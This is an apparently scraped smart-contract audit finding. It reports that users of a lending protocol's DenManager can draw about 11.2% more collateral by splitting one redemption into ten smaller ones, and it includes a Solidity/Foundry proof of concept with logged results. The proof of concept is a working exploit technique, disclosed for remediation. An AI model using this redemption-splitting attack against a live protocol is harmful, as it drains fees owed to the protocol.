# [M] Users can redeem more CollateralToken

## Summary
Severity: Medium
Contest weight: 0.5255
Dataset id: 2647
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Users can redeem more CollateralToken by splitting a single debtAmount into multiple smaller debtAmount.
The _updateBaseRateFromRedemption function increases the baseRate proportionally to collateralDrawn:
sol#L498-L513
In DenManager.sol#L692, collateralFee is calculated by the increased baseRate.
sol#L687-L692
Internal Pre-conditions
External Pre-conditions
Attack Path
Users can redeem more CollateralToken by splitting a single debtAmount into multiple smaller debtAmount.

## Proof of Concept
```solidity
In first case for single, redeemCollateral function is called with _debtAmount = 0.5e18. In second case for multiple, redeemCollateral function is called 10 times with _debtAmount = 0.05e18.
function test_redeemCollaterals_test_single() external {
    _openDen(depositor); // opens and adds 1.58 wBERA
    _addCollateralToDen(1e18); // adds 1 wBERA
    vm.warp(block.timestamp + beraborrowCore.dmBootstrapPeriod()); // 1 day after the bootstrap period

    //deal(address(wBERA), depositor, 1e18);
    uint prevDepositorNectarBalance = nectarToken.balanceOf(depositor);
    uint prevDepositorBeraBalance = IERC20(wBERA).balanceOf(depositor);
    uint prevFeeReceiverBeraBalance = IERC20(wBERA).balanceOf(beraborrowCore.feeReceiver());

    uint debtForRedeem = 0.5e18;
    (address firstRedemptionHint, uint256 partialRedemptionHintNICR,) = multiCollateralHintHelpers.getRedemptionHints(denManager, debtForRedeem, priceFeed.fetchPrice(address(wBERA)), 0);

    vm.prank(depositor);
    denManager.redeemCollateral({
        _debtAmount: debtForRedeem,
        _firstRedemptionHint: firstRedemptionHint,
        _upperPartialRedemptionHint: address(0),
        _lowerPartialRedemptionHint: address(0),
        _partialRedemptionHintNICR: partialRedemptionHintNICR,
        _maxIterations: uint256(0), // 0 means no limit
        _maxFeePercentage: 6e17 // 60%
        // even that has been no redemptions in 2 weeks, since the redemption is 100% of the debt, the fee is 50% (huge), the baseRate is 50%, while redemptionFeeFloor is 0.5%
    });

    uint newDepositorNectarBalance = nectarToken.balanceOf(depositor);
    uint newDepositorBeraBalance = IERC20(wBERA).balanceOf(depositor);
    uint newFeeReceiverBeraBalance = IERC20(wBERA).balanceOf(beraborrowCore.feeReceiver());

    console2.log("--- single ---");
    console2.log("Depositor NectarBalance Decrease", prevDepositorNectarBalance - newDepositorNectarBalance);
    console2.log("Depositor BeraBalance Increase", newDepositorBeraBalance - prevDepositorBeraBalance);
    console2.log("FeeReceiver BeraBalance Increase", newFeeReceiverBeraBalance - prevFeeReceiverBeraBalance);
}

function test_redeemCollaterals_test_multi() external {
    _openDen(depositor); // opens and adds 1.58 wBERA
    _addCollateralToDen(1e18); // adds 1 wBERA
    vm.warp(block.timestamp + beraborrowCore.dmBootstrapPeriod()); // 1 day after the bootstrap period

    uint prevDepositorNectarBalance = nectarToken.balanceOf(depositor);
    uint prevDepositorBeraBalance = IERC20(wBERA).balanceOf(depositor);
    uint prevFeeReceiverBeraBalance = IERC20(wBERA).balanceOf(beraborrowCore.feeReceiver());

    uint debtForRedeem = 0.5e18;
    for(uint i = 0; i < 10; i ++) {
        (address firstRedemptionHint, uint256 partialRedemptionHintNICR,) = multiCollateralHintHelpers.getRedemptionHints(denManager, debtForRedeem / 10, priceFeed.fetchPrice(address(wBERA)), 0);

        vm.prank(depositor);
        denManager.redeemCollateral({
            _debtAmount: debtForRedeem / 10,
            _firstRedemptionHint: firstRedemptionHint,
            _upperPartialRedemptionHint: address(0),
            _lowerPartialRedemptionHint: address(0),
            _partialRedemptionHintNICR: partialRedemptionHintNICR,
            _maxIterations: uint256(0), // 0 means no limit
            _maxFeePercentage: 6e17 // 60%
            // even that has been no redemptions in 2 weeks, since the redemption is 100% of the debt, the fee is 50% (huge), the baseRate is 50%, while redemptionFeeFloor is 0.5%
        });
        vm.stopPrank();
    }
    uint newDepositorNectarBalance = nectarToken.balanceOf(depositor);
    uint newDepositorBeraBalance = IERC20(wBERA).balanceOf(depositor);
    uint newFeeReceiverBeraBalance = IERC20(wBERA).balanceOf(beraborrowCore.feeReceiver());

    console2.log("--- multi ---");
    console2.log("Depositor NectarBalance Decrease", prevDepositorNectarBalance - newDepositorNectarBalance);
    console2.log("Depositor BeraBalance Increase", newDepositorBeraBalance - prevDepositorBeraBalance);
    console2.log("FeeReceiver BeraBalance Increase", newFeeReceiverBeraBalance - prevFeeReceiverBeraBalance);
}
--- single --- Depositor NectarBalance Decrease 500000000000000000 Depositor BeraBalance Increase 373121890547263682 FeeReceiver BeraBalance Increase 126878109452736318
--- multi --- Depositor NectarBalance Decrease 500000000000000000 Depositor BeraBalance Increase 415201653496957928 FeeReceiver BeraBalance Increase 84798346503042072
CollateralDrawn_single = 373121890547263682 CollateralDrawn_multi = 415201653496957928
415201653496957928 - 373121890547263682 = 42,079,762,949,694,246 42,079,762,949,694,246 * 100 / 373121890547263682 = 11.2%
Excess token amount is 11.2% of CollateralDrawn_single.
```

## Recommendation
Check the logic of _updateBaseRateFromRedemption or set a minimum _debtAmount to prevent manipulation of small redeem.
